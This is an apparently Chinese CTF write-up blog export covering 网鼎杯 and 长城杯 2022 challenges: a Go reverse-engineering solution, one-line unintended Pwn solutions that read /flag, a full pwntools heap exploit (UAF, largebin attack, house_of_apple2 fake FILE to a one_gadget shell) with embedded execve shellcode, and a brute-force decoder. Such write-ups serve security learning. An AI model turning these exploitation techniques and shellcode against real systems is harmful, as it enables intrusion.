<h3 id="re693"><a href="#re693" class="headerlink" title="re693"></a>re693</h3><p>用go语言写的程序，将后缀名改成<code>.go</code>，用vscode打开，代码量比较大有一万五千行左右。程序会输出两句提示，根据提示找到关键输入，接下来就比较简单了，下面是关键代码和写的一些注释：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GwSqNHQ7dPXpIG64</span><span class="params">(cJPTR <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	YrXQd := hex.EncodeToString([]<span class="type">byte</span>(cJPTR)) <span class="comment">// change to hex</span></span><br><span class="line">	<span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c&quot;</span>, YrXQd[<span class="number">22</span>], YrXQd[<span class="number">19</span>], YrXQd[<span class="number">20</span>], YrXQd[<span class="number">21</span>], YrXQd[<span class="number">28</span>], YrXQd[<span class="number">10</span>], YrXQd[<span class="number">20</span>], YrXQd[<span class="number">7</span>], YrXQd[<span class="number">29</span>], YrXQd[<span class="number">14</span>], YrXQd[<span class="number">0</span>], YrXQd[<span class="number">18</span>], YrXQd[<span class="number">3</span>], YrXQd[<span class="number">24</span>], YrXQd[<span class="number">27</span>], YrXQd[<span class="number">31</span>])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> nFAzj, CuSkl <span class="type">string</span></span><br><span class="line">	jjxXf := []<span class="type">byte</span>&#123;</span><br><span class="line">		<span class="number">37</span>, <span class="number">73</span>, <span class="number">151</span>, <span class="number">135</span>, <span class="number">65</span>, <span class="number">58</span>, <span class="number">241</span>, <span class="number">90</span>, <span class="number">33</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">41</span>, <span class="number">102</span>, <span class="number">241</span>, <span class="number">213</span>, <span class="number">234</span>, <span class="number">67</span>, <span class="number">144</span>, <span class="number">139</span>, <span class="number">20</span>, <span class="number">112</span>, <span class="number">150</span>, <span class="number">41</span>, <span class="number">7</span>, <span class="number">158</span>, <span class="number">251</span>, <span class="number">167</span>, <span class="number">249</span>, <span class="number">24</span>, <span class="number">129</span>, <span class="number">72</span>, <span class="number">64</span>, <span class="number">83</span>, <span class="number">142</span>, <span class="number">166</span>, <span class="number">236</span>, <span class="number">67</span>, <span class="number">18</span>, <span class="number">211</span>, <span class="number">100</span>, <span class="number">91</span>, <span class="number">38</span>, <span class="number">83</span>, <span class="number">147</span>, <span class="number">40</span>, <span class="number">78</span>, <span class="number">239</span>, <span class="number">113</span>, <span class="number">232</span>, <span class="number">83</span>, <span class="number">227</span>, <span class="number">47</span>, <span class="number">192</span>, <span class="number">227</span>, <span class="number">70</span>, <span class="number">167</span>, <span class="number">201</span>, <span class="number">249</span>, <span class="number">156</span>, <span class="number">101</span>, <span class="number">216</span>, <span class="number">159</span>, <span class="number">116</span>, <span class="number">210</span>, <span class="number">152</span>, <span class="number">234</span>, <span class="number">38</span>, <span class="number">145</span>, <span class="number">198</span>, <span class="number">58</span>, <span class="number">24</span>, <span class="number">183</span>, <span class="number">72</span>, <span class="number">143</span>, <span class="number">136</span>, <span class="number">234</span>, <span class="number">246</span>&#125;</span><br><span class="line">	KdlaH := []<span class="type">byte</span>&#123;</span><br><span class="line">		<span class="number">191</span>, <span class="number">140</span>, <span class="number">114</span>, <span class="number">245</span>, <span class="number">142</span>, <span class="number">55</span>, <span class="number">190</span>, <span class="number">30</span>, <span class="number">161</span>, <span class="number">18</span>, <span class="number">200</span>, <span class="number">7</span>, <span class="number">21</span>, <span class="number">59</span>, <span class="number">17</span>, <span class="number">44</span>, <span class="number">34</span>, <span class="number">181</span>, <span class="number">109</span>, <span class="number">116</span>, <span class="number">146</span>, <span class="number">145</span>, <span class="number">189</span>, <span class="number">68</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">46</span>, <span class="number">184</span>, <span class="number">21</span>, <span class="number">33</span>, <span class="number">66</span>, <span class="number">99</span>, <span class="number">124</span>, <span class="number">167</span>, <span class="number">201</span>, <span class="number">88</span>, <span class="number">133</span>, <span class="number">20</span>, <span class="number">211</span>, <span class="number">67</span>, <span class="number">133</span>, <span class="number">250</span>, <span class="number">62</span>, <span class="number">28</span>, <span class="number">138</span>, <span class="number">229</span>, <span class="number">105</span>, <span class="number">102</span>, <span class="number">125</span>, <span class="number">124</span>, <span class="number">208</span>, <span class="number">180</span>, <span class="number">50</span>, <span class="number">146</span>, <span class="number">67</span>, <span class="number">39</span>, <span class="number">55</span>, <span class="number">240</span>, <span class="number">239</span>, <span class="number">203</span>, <span class="number">230</span>, <span class="number">142</span>, <span class="number">20</span>, <span class="number">90</span>, <span class="number">205</span>, <span class="number">27</span>, <span class="number">128</span>, <span class="number">136</span>, <span class="number">151</span>, <span class="number">140</span>, <span class="number">222</span>, <span class="number">92</span>, <span class="number">152</span>, <span class="number">1</span>, <span class="number">222</span>, <span class="number">138</span>, <span class="number">254</span>, <span class="number">246</span>, <span class="number">223</span>, <span class="number">224</span>, <span class="number">236</span>, <span class="number">33</span>, <span class="number">60</span>, <span class="number">170</span>, <span class="number">189</span>, <span class="number">77</span>, <span class="number">124</span>, <span class="number">72</span>, <span class="number">135</span>, <span class="number">46</span>, <span class="number">235</span>, <span class="number">17</span>, <span class="number">32</span>, <span class="number">28</span>, <span class="number">245</span>&#125;</span><br><span class="line">	fmt.Print(MPyt9GWTRfAFNvb1(jjxXf)) <span class="comment">// Input the first function, which has 6 parameters and the third named gLIhR:</span></span><br><span class="line">	<span class="comment">// nFAzj = &#x27;ZlXDJkH3OZN4Mayd&#x27;</span></span><br><span class="line">	fmt.Scanf(<span class="string">&quot;%20s&quot;</span>, &amp;nFAzj)</span><br><span class="line">	fmt.Print(kZ2BFvOxepd5ALDR(KdlaH)) <span class="comment">// Input the second function, which has 3 callers and invokes the function named cHZv5op8rOmlAkb6:</span></span><br><span class="line">	<span class="comment">// CuSkl = &#x27;UhnCm82SDGE0zLYO&#x27;</span></span><br><span class="line">	fmt.Scanf(<span class="string">&quot;%20s&quot;</span>, &amp;CuSkl)</span><br><span class="line">	vNvUO := GwSqNHQ7dPXpIG64(nFAzj)</span><br><span class="line">	YJCya := <span class="string">&quot;&quot;</span></span><br><span class="line">	mvOxK := YI3z8ZxOKhfLmTPC(CuSkl)</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    func UhnCm82SDGE0zLYO() string &#123;</span></span><br><span class="line"><span class="comment">        SythK := []byte&#123;</span></span><br><span class="line"><span class="comment">            159, 141, 72, 106, 196, 62, 16, 205, 170, 159, 36, 232, 125, 239, 208, 3&#125;</span></span><br><span class="line"><span class="comment">        var Vw2mJ, Nij87, zVclR string</span></span><br><span class="line"><span class="comment">        return cHZv5op8rOmlAkb6(SythK, Vw2mJ, Nij87, zVclR)</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    func cHZv5op8rOmlAkb6(HIGXt []byte, VGvny string, ZOkKV string, eU0uD string) string &#123;</span></span><br><span class="line"><span class="comment">	QTk4l := make([]byte, 20)</span></span><br><span class="line"><span class="comment">	Ek08m := [16]byte&#123;</span></span><br><span class="line"><span class="comment">		167, 238, 45, 89, 160, 95, 34, 175, 158, 169, 20, 217, 68, 137, 231, 54&#125;</span></span><br><span class="line"><span class="comment">	for i := 0; i &lt; 16; i++ &#123;</span></span><br><span class="line"><span class="comment">		QTk4l[i] += Ek08m[i] ^ HIGXt[i]</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">	return string(QTk4l)</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	<span class="keyword">if</span> mvOxK != <span class="literal">nil</span> &#123;</span><br><span class="line">		YJCya = mvOxK()</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> YJCya != <span class="string">&quot;&quot;</span> &amp;&amp; vNvUO != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;flag&#123;%s%s&#125;\n&quot;</span>, vNvUO, YJCya)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>做以下变更，然后运行一下flag就出来了：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// var nFAzj, CuSkl string</span></span><br><span class="line">	jjxXf := []<span class="type">byte</span>&#123;</span><br><span class="line">		<span class="number">37</span>, <span class="number">73</span>, <span class="number">151</span>, <span class="number">135</span>, <span class="number">65</span>, <span class="number">58</span>, <span class="number">241</span>, <span class="number">90</span>, <span class="number">33</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">41</span>, <span class="number">102</span>, <span class="number">241</span>, <span class="number">213</span>, <span class="number">234</span>, <span class="number">67</span>, <span class="number">144</span>, <span class="number">139</span>, <span class="number">20</span>, <span class="number">112</span>, <span class="number">150</span>, <span class="number">41</span>, <span class="number">7</span>, <span class="number">158</span>, <span class="number">251</span>, <span class="number">167</span>, <span class="number">249</span>, <span class="number">24</span>, <span class="number">129</span>, <span class="number">72</span>, <span class="number">64</span>, <span class="number">83</span>, <span class="number">142</span>, <span class="number">166</span>, <span class="number">236</span>, <span class="number">67</span>, <span class="number">18</span>, <span class="number">211</span>, <span class="number">100</span>, <span class="number">91</span>, <span class="number">38</span>, <span class="number">83</span>, <span class="number">147</span>, <span class="number">40</span>, <span class="number">78</span>, <span class="number">239</span>, <span class="number">113</span>, <span class="number">232</span>, <span class="number">83</span>, <span class="number">227</span>, <span class="number">47</span>, <span class="number">192</span>, <span class="number">227</span>, <span class="number">70</span>, <span class="number">167</span>, <span class="number">201</span>, <span class="number">249</span>, <span class="number">156</span>, <span class="number">101</span>, <span class="number">216</span>, <span class="number">159</span>, <span class="number">116</span>, <span class="number">210</span>, <span class="number">152</span>, <span class="number">234</span>, <span class="number">38</span>, <span class="number">145</span>, <span class="number">198</span>, <span class="number">58</span>, <span class="number">24</span>, <span class="number">183</span>, <span class="number">72</span>, <span class="number">143</span>, <span class="number">136</span>, <span class="number">234</span>, <span class="number">246</span>&#125;</span><br><span class="line">	KdlaH := []<span class="type">byte</span>&#123;</span><br><span class="line">		<span class="number">191</span>, <span class="number">140</span>, <span class="number">114</span>, <span class="number">245</span>, <span class="number">142</span>, <span class="number">55</span>, <span class="number">190</span>, <span class="number">30</span>, <span class="number">161</span>, <span class="number">18</span>, <span class="number">200</span>, <span class="number">7</span>, <span class="number">21</span>, <span class="number">59</span>, <span class="number">17</span>, <span class="number">44</span>, <span class="number">34</span>, <span class="number">181</span>, <span class="number">109</span>, <span class="number">116</span>, <span class="number">146</span>, <span class="number">145</span>, <span class="number">189</span>, <span class="number">68</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">46</span>, <span class="number">184</span>, <span class="number">21</span>, <span class="number">33</span>, <span class="number">66</span>, <span class="number">99</span>, <span class="number">124</span>, <span class="number">167</span>, <span class="number">201</span>, <span class="number">88</span>, <span class="number">133</span>, <span class="number">20</span>, <span class="number">211</span>, <span class="number">67</span>, <span class="number">133</span>, <span class="number">250</span>, <span class="number">62</span>, <span class="number">28</span>, <span class="number">138</span>, <span class="number">229</span>, <span class="number">105</span>, <span class="number">102</span>, <span class="number">125</span>, <span class="number">124</span>, <span class="number">208</span>, <span class="number">180</span>, <span class="number">50</span>, <span class="number">146</span>, <span class="number">67</span>, <span class="number">39</span>, <span class="number">55</span>, <span class="number">240</span>, <span class="number">239</span>, <span class="number">203</span>, <span class="number">230</span>, <span class="number">142</span>, <span class="number">20</span>, <span class="number">90</span>, <span class="number">205</span>, <span class="number">27</span>, <span class="number">128</span>, <span class="number">136</span>, <span class="number">151</span>, <span class="number">140</span>, <span class="number">222</span>, <span class="number">92</span>, <span class="number">152</span>, <span class="number">1</span>, <span class="number">222</span>, <span class="number">138</span>, <span class="number">254</span>, <span class="number">246</span>, <span class="number">223</span>, <span class="number">224</span>, <span class="number">236</span>, <span class="number">33</span>, <span class="number">60</span>, <span class="number">170</span>, <span class="number">189</span>, <span class="number">77</span>, <span class="number">124</span>, <span class="number">72</span>, <span class="number">135</span>, <span class="number">46</span>, <span class="number">235</span>, <span class="number">17</span>, <span class="number">32</span>, <span class="number">28</span>, <span class="number">245</span>&#125;</span><br><span class="line">	fmt.Print(MPyt9GWTRfAFNvb1(jjxXf)) <span class="comment">// Input the first function, which has 6 parameters and the third named gLIhR:</span></span><br><span class="line">	<span class="comment">// nFAzj = &#x27;ZlXDJkH3OZN4Mayd&#x27;</span></span><br><span class="line">	<span class="comment">// fmt.Scanf(&quot;%20s&quot;, &amp;nFAzj)</span></span><br><span class="line">	fmt.Print(kZ2BFvOxepd5ALDR(KdlaH)) <span class="comment">// Input the second function, which has 3 callers and invokes the function named cHZv5op8rOmlAkb6:</span></span><br><span class="line">	<span class="comment">// CuSkl = &#x27;UhnCm82SDGE0zLYO&#x27;</span></span><br><span class="line">	<span class="comment">// fmt.Scanf(&quot;%20s&quot;, &amp;CuSkl)</span></span><br><span class="line">	vNvUO := GwSqNHQ7dPXpIG64(<span class="string">&quot;ZlXDJkH3OZN4Mayd&quot;</span>)</span><br><span class="line">	YJCya := <span class="string">&quot;&quot;</span></span><br><span class="line">	mvOxK := YI3z8ZxOKhfLmTPC(<span class="string">&quot;UhnCm82SDGE0zLYO&quot;</span>)</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>两道非预期解</p>
<h3 id="BabyV8"><a href="#BabyV8" class="headerlink" title="BabyV8"></a>BabyV8</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">read</span>(<span class="string">&quot;/flag&quot;</span>))</span><br><span class="line">&lt;EOF&gt;</span><br></pre></td></tr></table></figure>



<h3 id="pwn497-minishell-pwn349"><a href="#pwn497-minishell-pwn349" class="headerlink" title="pwn497(minishell) &amp; pwn349"></a>pwn497(minishell) &amp; pwn349</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用编译器报错打印功能</span></span><br><span class="line">./cc1 /flag -o /pwn</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>网鼎杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 长城杯</title>
    <url>/2022/08/25/CTF/2022%E9%95%BF%E5%9F%8E%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="glibc-master"><a href="#glibc-master" class="headerlink" title="glibc_master"></a>glibc_master</h2><p>存在uaf，并且只能分配largebin大小的chunk，主要问题是没给libc，需要结合远程调试，可以通过泄露main_arena的地址，然后通过寻找libc的数据库来确定libc的版本，推荐一个网站：<a href="https://libc.rip/">libc-database</a>。有了libc的版本就好处理了，一开始采用的是<code>house_of_cat</code>，但是rcx寄存器为0过不了检查，所以采用<code>house_of_apple2</code>。</p>
<span id="more"></span>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./glibc_master&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./glibc_master&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;input index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;input size:&#x27;</span>, <span class="built_in">str</span>(size))   <span class="comment"># 0x40e &lt; size &lt;= 0x60f</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;input index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;input context:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):      <span class="comment"># only three times</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;input index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;input index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x518</span>)   <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x418</span>)   <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x508</span>)   <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x418</span>)   <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena = uu64() - <span class="number">0x60</span></span><br><span class="line">lg(<span class="string">&#x27;main_arena&#x27;</span>)</span><br><span class="line">libc_base = main_arena - <span class="number">0x1ecb80</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">io_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;io_list_all&#x27;</span>)</span><br><span class="line">io_wfile_jumps = libc_base + <span class="number">0x1e8f60</span></span><br><span class="line">ogg = libc_base + <span class="number">0xe3b01</span></span><br><span class="line">lg(<span class="string">&#x27;ogg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">heap_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x290</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x508</span>)   <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x5f8</span>)   <span class="comment"># 5</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">pld = p64(libc_base + <span class="number">0x1ed010</span>) * <span class="number">2</span></span><br><span class="line">pld += p64(heap_base + <span class="number">0x290</span>) + p64(io_list_all - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>, pld)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x5f8</span>)   <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># _flags = prev_size = 0</span></span><br><span class="line"><span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file1 = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x10</span>)</span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># fp -&gt; _IO_write_base</span></span><br><span class="line">fake_file1 += p64(<span class="number">1</span>)    <span class="comment"># fp -&gt; _IO_write_ptr</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># fp -&gt; _IO_write_end</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base)     <span class="comment"># _lock</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0xbd0</span> + <span class="number">0x100</span>)    <span class="comment"># _wide_data</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(io_wfile_jumps)      <span class="comment"># vtable</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x100</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_wide = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x68</span></span><br><span class="line">fake_wide += p64(ogg)     <span class="comment"># _wide_vtable + 0x68</span></span><br><span class="line"><span class="comment"># fake_wide = fake_wide.ljust(0xa0, b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="comment"># fake_wide += p64(heap_base + 0x1c90)    # rsp -&gt; orw_addr</span></span><br><span class="line"><span class="comment"># fake_wide += p64(p_rdi_r + 1)       # rip -&gt; ret</span></span><br><span class="line">fake_wide = fake_wide.ljust(<span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_wide += p64(heap_base + <span class="number">0xbd0</span> + <span class="number">0x100</span>)     <span class="comment"># _wide_vtable</span></span><br><span class="line"></span><br><span class="line">fake_file1 += fake_wide</span><br><span class="line">edit(<span class="number">4</span>, fake_file1)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">sla(<span class="string">&#x27;input index:&#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="baby-re"><a href="#baby-re" class="headerlink" title="baby_re"></a>baby_re</h2><p>其他文章有详细表述，这里只给出WP：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> new <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#123;&#125;&#x27;</span></span><br><span class="line">ciphertext = <span class="string">&#x27;5WEU5ROREb0hK+AurHXCD80or/h96jqpjEhcoh2CuDh=&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">tm = <span class="built_in">len</span>(ciphertext) / <span class="number">4</span></span><br><span class="line"><span class="comment"># print(tm)</span></span><br><span class="line">lab = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> tm &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">                tmp = flag + i + j + k</span><br><span class="line">                pt = mmo(tmp)</span><br><span class="line">                rs = pt()</span><br><span class="line">                <span class="keyword">if</span> ciphertext.startswith(rs):</span><br><span class="line">                    lab = <span class="number">1</span></span><br><span class="line">                    flag += i + j + k</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> lab == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> lab == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    tm -= <span class="number">1</span></span><br><span class="line">    lab = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> tm == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">                tmp = flag + i + j</span><br><span class="line">                pt = mmo(tmp)</span><br><span class="line">                rs = pt()</span><br><span class="line">                <span class="keyword">if</span> ciphertext.startswith(rs):</span><br><span class="line">                    lab = <span class="number">1</span></span><br><span class="line">                    flag += i + j</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> lab == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> lab == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + flag + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="rabbit-hole"><a href="#rabbit-hole" class="headerlink" title="rabbit_hole"></a>rabbit_hole</h2><p>一道迷宫题，主要是找到迷宫。</p>
